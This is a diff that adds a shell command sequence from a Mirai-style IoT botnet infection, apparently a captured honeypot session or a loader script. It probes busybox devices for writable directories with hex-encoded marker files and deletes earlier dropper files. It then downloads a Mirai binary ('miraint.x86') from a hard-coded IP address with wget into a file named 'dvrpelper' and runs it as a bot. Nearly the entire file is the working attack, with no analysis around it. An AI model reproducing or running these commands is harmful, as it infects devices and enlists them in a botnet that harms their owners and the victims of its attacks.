@@ -1,0 +1,34 @@
+enable
+shell
+sh
+/bin/busybox ECCHI
+/bin/busybox ps; /bin/busybox ECCHI
+/bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+/bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon; /bin/busybox cat /proc/.nippon; /bin/busybox rm /proc/.nippon
+/bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon; /bin/busybox cat /sys/.nippon; /bin/busybox rm /sys/.nippon
+/bin/busybox echo -e '\x6b\x61\x6d\x69/tmp' > /tmp/.nippon; /bin/busybox cat /tmp/.nippon; /bin/busybox rm /tmp/.nippon
+/bin/busybox echo -e '\x6b\x61\x6d\x69/overlay' > /overlay/.nippon; /bin/busybox cat /overlay/.nippon; /bin/busybox rm /overlay/.nippon
+/bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
+/bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+/bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon; /bin/busybox cat /dev/pts/.nippon; /bin/busybox rm /dev/pts/.nippon
+/bin/busybox echo -e '\x6b\x61\x6d\x69/sys/kernel/debug' > /sys/kernel/debug/.nippon; /bin/busybox cat /sys/kernel/debug/.nippon; /bin/busybox rm /sys/kernel/debug/.
+/bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+/bin/busybox ECCHI
+rm /proc/.t; rm /proc/.sh; rm /proc/.human
+rm /sys/.t; rm /sys/.sh; rm /sys/.human
+rm /tmp/.t; rm /tmp/.sh; rm /tmp/.human
+rm /overlay/.t; rm /overlay/.sh; rm /overlay/.human
+rm /.t; rm /.sh; rm /.human
+rm /dev/.t; rm /dev/.sh; rm /dev/.human
+rm /dev/pts/.t; rm /dev/pts/.sh; rm /dev/pts/.human
+rm /sys/kernel/debug/.t; rm /sys/kernel/debug/.sh; rm /sys/kernel/debug/.human
+rm /dev/.t; rm /dev/.sh; rm /dev/.human
+cd /proc/
+/bin/busybox cp /bin/echo dvrpelper; >dvrpelper; /bin/busybox chmod 777 dvrpelper; /bin/busybox ECCHI
+/bin/busybox cat /bin/echo
+/bin/busybox ECCHI
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox ECCHI
+/bin/busybox wget http://95.215.60.17:80/bins/miraint.x86 -O - > dvrpelper; /bin/busybox chmod 777 dvrpelper; /bin/busybox ECCHI
+./dvrpelper telnet.x86.bot.wget; /bin/busybox IHCCE
+rm -rf upnp; > dvrpelper; /bin/busybox ECCHI
+cat /proc/mounts; (/bin/busybox DFYHE || :)
